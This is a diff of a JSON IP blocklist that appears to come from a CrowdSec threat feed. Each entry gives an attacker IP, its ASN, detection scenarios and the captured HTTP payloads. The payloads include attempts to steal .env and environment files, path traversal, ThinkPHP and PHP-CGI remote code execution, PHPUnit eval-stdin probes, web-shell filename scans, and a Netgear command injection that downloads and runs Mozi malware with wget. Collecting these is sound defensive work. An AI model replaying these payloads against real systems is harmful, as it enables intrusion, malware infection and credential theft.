@@ -1,132 +1,13 @@
 {
-  "generated_at": "2026-10-16T01:00:00Z",
+  "generated_at": "2026-10-16T13:00:00Z",
   "ttl_days": 7,
   "scope": "crowdsec",
   "counts": {
-    "total": 67,
-    "v4": 67,
+    "total": 72,
+    "v4": 72,
     "v6": 0
   },
   "items": [
-    {
-      "ip": "34.87.174.130",
-      "family": "v4",
-      "first_seen": "2026-10-08T21:00:00Z",
-      "last_seen": "2026-10-09T04:00:00Z",
-      "scenarios": [
-        "crowdsec/http-admin-interface-probing",
-        "crowdsec/http-bad-user-agent",
-        "crowdsec/http-crawl-non_statics",
-        "crowdsec/http-dos-swithcing-ua",
-        "crowdsec/http-path-traversal-probing",
-        "crowdsec/http-probing",
-        "crowdsec/http-sensitive-files"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "396982",
-      "asn_name": "GOOGLE-CLOUD-PLATFORM - Google LLC",
-      "asn_prefix": "34.87.160.0/20",
-      "tags": [
-        "mwl:cloud=\"gcp\""
-      ],
-      "payloads": [
-        "POST /graphql",
-        "GET /.env",
-        "GET /proc/self/environ",
-        "GET /api/proc/self/environ",
-        "POST /api/graphql",
-        "GET /proc/self/cgroup",
-        "GET /proc/self/cmdline",
-        "POST /",
-        "GET /.env.backup",
-        "GET /.env.production",
-        "GET /e4gn03x2fydp8i5m0ac3",
-        "GET /nmh7pdlcy55qjdjv30ll",
-        "GET /[REDACTED_DOMAIN]",
-        "GET /api/system/fileView?file=/app/.env",
-        "GET /api/system/fileView?file=/proc/self/environ",
-        "GET /userfiles?path=../../../.env",
-        "GET /userfiles?path=../../.env",
-        "GET /userfiles?path=../../../../proc/self/environ",
-        "GET /userfiles/x?path=../../../../proc/self/environ",
-        "GET /"
-      ]
-    },
-    {
-      "ip": "20.205.114.149",
-      "family": "v4",
-      "first_seen": "2026-10-09T10:00:00Z",
-      "last_seen": "2026-10-09T10:00:00Z",
-      "scenarios": [
-        "crowdsec/http-admin-interface-probing",
-        "crowdsec/http-probing"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "8075",
-      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
-      "asn_prefix": "20.192.0.0/10",
-      "tags": [
-        "mwl:cloud=\"azure\""
-      ],
-      "payloads": [
-        "GET /wp-admin/css/colors/midnight/",
-        "GET /manager.php?p=",
-        "GET /adminfuns.php",
-        "GET /wp-content/plugins/hellopress/wp_filemanager.php",
-        "GET /this_is_a_new_hello_world.php",
-        "GET /ws.php",
-        "GET /xivoefjr.php",
-        "GET /bnmtp.php",
-        "GET /or.php",
-        "GET /date1.php",
-        "GET /opsh.php",
-        "GET /kgb.php",
-        "GET /wp-atom.php"
-      ]
-    },
-    {
-      "ip": "74.225.200.149",
-      "family": "v4",
-      "first_seen": "2026-10-09T02:00:00Z",
-      "last_seen": "2026-10-09T02:00:00Z",
-      "scenarios": [
-        "crowdsec/http-admin-interface-probing",
-        "crowdsec/http-backdoors-attempts",
-        "crowdsec/http-probing",
-        "crowdsec/http-technology-probing",
-        "crowdsec/http-wordpress-scan"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "8075",
-      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
-      "asn_prefix": "74.224.0.0/14",
-      "tags": [
-        "mwl:cloud=\"azure\""
-      ],
-      "payloads": [
-        "GET /1.php",
-        "GET /css.php",
-        "GET /wp-content/index.php",
-        "GET /wp-admin/css/colors/index.php",
-        "GET /wp-admin/network/index.php",
-        "GET /wp-includes/IXR/index.php",
-        "GET /info.php",
-        "GET /wp-includes/images/",
-        "GET /wp-includes/images/smilies/",
-        "GET /222.php",
-        "GET /classwithtostring.php",
-        "GET /lock360.php",
-        "GET /up.php",
-        "GET /admin.php",
-        "GET /chosen.php"
-      ]
-    },
     {
       "ip": "20.200.211.114",
       "family": "v4",
@@ -2143,6 +2024,230 @@
         "GET /np.php?p=",
         "GET /samll.php",
         "GET /config.php?"
+      ]
+    },
+    {
+      "ip": "216.218.206.67",
+      "family": "v4",
+      "first_seen": "2026-10-16T11:00:00Z",
+      "last_seen": "2026-10-16T11:00:00Z",
+      "scenarios": [
+        "crowdsec/http-technology-probing"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "6939",
+      "asn_name": "HURRICANE - Hurricane Electric LLC",
+      "asn_prefix": "216.218.128.0/17",
+      "tags": [
+        "mwl:scanner=\"shadowserver\""
+      ],
+      "payloads": [
+        "GET /remote/logincheck"
+      ]
+    },
+    {
+      "ip": "200.150.163.108",
+      "family": "v4",
+      "first_seen": "2026-10-16T11:00:00Z",
+      "last_seen": "2026-10-16T11:00:00Z",
+      "scenarios": [
+        "crowdsec/CVE-2017-9841",
+        "crowdsec/http-probing",
+        "crowdsec/thinkphp-cve-2018-20062"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "22381",
+      "asn_name": "AS22381 - SAMM TECNOLOGIA E TELECOMUNICACOES S.A",
+      "asn_prefix": "200.150.163.0/24",
+      "payloads": [
+        "GET /index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello",
+        "POST /bin/sh",
+        "POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
+        "POST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
+        "POST /index.php?%25ADd+allow_url_include%3D1+%25ADd+auto_prepend_file%3Dphp://input",
+        "POST /test.hello?%25ADd+allow_url_include%3D1+%25ADd+auto_prepend_file%3Dphp://input",
+        "POST /index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input",
+        "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
+        "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php",
+        "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php",
+        "GET /vendor/phpunit/Util/PHP/eval-stdin.php",
+        "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php"
+      ]
+    },
+    {
+      "ip": "202.47.54.190",
+      "family": "v4",
+      "first_seen": "2026-10-16T10:00:00Z",
+      "last_seen": "2026-10-16T10:00:00Z",
+      "scenarios": [
+        "crowdsec/http-cve-probing",
+        "crowdsec/netgear_rce",
+        "suricata/SERVER-WEBAPP Netgear DGN1000 series routers authentication bypass attempt"
+      ],
+      "sources": [
+        "crowdsec",
+        "suricata"
+      ],
+      "asn": "9541",
+      "asn_name": "CYBERNET-AP - Cyber Internet Services (Pvt) Ltd.",
+      "asn_prefix": "202.47.54.0/24",
+      "payloads": [
+        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*&wget+http://202.47.54.190:36287/Mozi.m+-O+/tmp/netgear&sh+netgear&curpath=/&currentsetting.htm=1",
+        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://202.47.54.190:36287/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
+      ]
+    },
+    {
+      "ip": "34.50.72.95",
+      "family": "v4",
+      "first_seen": "2026-10-16T10:00:00Z",
+      "last_seen": "2026-10-16T10:00:00Z",
+      "scenarios": [
+        "crowdsec/http-admin-interface-probing",
+        "crowdsec/http-probing",
+        "crowdsec/http-sensitive-files",
+        "crowdsec/http-technology-probing"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "396982",
+      "asn_name": "GOOGLE-CLOUD-PLATFORM - Google LLC",
+      "asn_prefix": "34.50.64.0/18",
+      "tags": [
+        "mwl:cloud=\"gcp\""
+      ],
+      "payloads": [
+        "GET /administrator/.env",
+        "GET /phpinfo.php",
+        "GET /phpinfo",
+        "GET /info.php",
+        "GET /",
+        "GET /.git/config",
+        "GET /.env",
+        "GET /.env.local",
+        "GET /.env.production",
+        "GET /.env.staging",
+        "GET /.env.development",
+        "GET /.env.test",
+        "GET /.env.remote",
+        "GET /.env.bak",
+        "GET /.env.backup"
+      ]
+    },
+    {
+      "ip": "48.217.66.50",
+      "family": "v4",
+      "first_seen": "2026-10-16T09:00:00Z",
+      "last_seen": "2026-10-16T09:00:00Z",
+      "scenarios": [
+        "crowdsec/http-technology-probing"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "8075",
+      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
+      "asn_prefix": "48.216.0.0/14",
+      "tags": [
+        "mwl:cloud=\"azure\""
+      ],
+      "payloads": [
+        "GET /owa/auth/x.js"
+      ]
+    },
+    {
+      "ip": "13.70.110.189",
+      "family": "v4",
+      "first_seen": "2026-10-16T08:00:00Z",
+      "last_seen": "2026-10-16T08:00:00Z",
+      "scenarios": [
+        "crowdsec/http-probing",
+        "crowdsec/http-wordpress-scan"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "8075",
+      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
+      "asn_prefix": "13.64.0.0/11",
+      "tags": [
+        "mwl:cloud=\"azure\""
+      ],
+      "payloads": [
+        "GET /wp-content/plugins/hellopress/wp_filemanager.php",
+        "GET /wp-track3.php",
+        "GET /wp-crons.php",
+        "GET /wp-content/shiny.php",
+        "GET /this_is_a_new_hello_world.php",
+        "GET /vhmnn.php",
+        "GET /22name.php",
+        "GET /24name.php",
+        "GET /.well-known/sid3.php",
+        "GET /ws39.php",
+        "GET /xxw.php",
+        "GET /opsh.php"
+      ]
+    },
+    {
+      "ip": "20.193.50.139",
+      "family": "v4",
+      "first_seen": "2026-10-16T05:00:00Z",
+      "last_seen": "2026-10-16T05:00:00Z",
+      "scenarios": [
+        "crowdsec/http-probing"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "8075",
+      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
+      "asn_prefix": "20.192.0.0/10",
+      "tags": [
+        "mwl:cloud=\"azure\""
+      ],
+      "payloads": [
+        "GET /zc-220.php",
+        "GET /sale.php",
+        "GET /jodohghi.php",
+        "GET /x123.php",
+        "GET /cae2.3.php",
+        "GET /wp-class.php",
+        "GET /3akp.php",
+        "GET /xpass.php",
+        "GET /wp-filemannger4h.php",
+        "GET /gvg1bvpsgtot1rpklCdefault.php",
+        "GET /Sanskrit.php",
+        "GET /Geforce.php",
+        "GET /dgmry.php",
+        "GET /hbvdoz7cy9k6xge9zhuvkvitCdefault.php",
+        "GET /G-In.php",
+        "GET /defeg.php",
+        "GET /bfasb.php",
+        "GET /atomlib.php",
+        "GET /vhwwnrnmqc.php",
+        "GET /byypas.php"
+      ]
+    },
+    {
+      "ip": "184.105.139.68",
+      "family": "v4",
+      "first_seen": "2026-10-16T04:00:00Z",
+      "last_seen": "2026-10-16T04:00:00Z",
+      "scenarios": [
+        "crowdsec/http-technology-probing"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "6939",
+      "asn_name": "HURRICANE - Hurricane Electric LLC",
+      "asn_prefix": "184.104.0.0/15",
+      "payloads": [
+        "GET /remote/logincheck"
       ]
     }
   ]
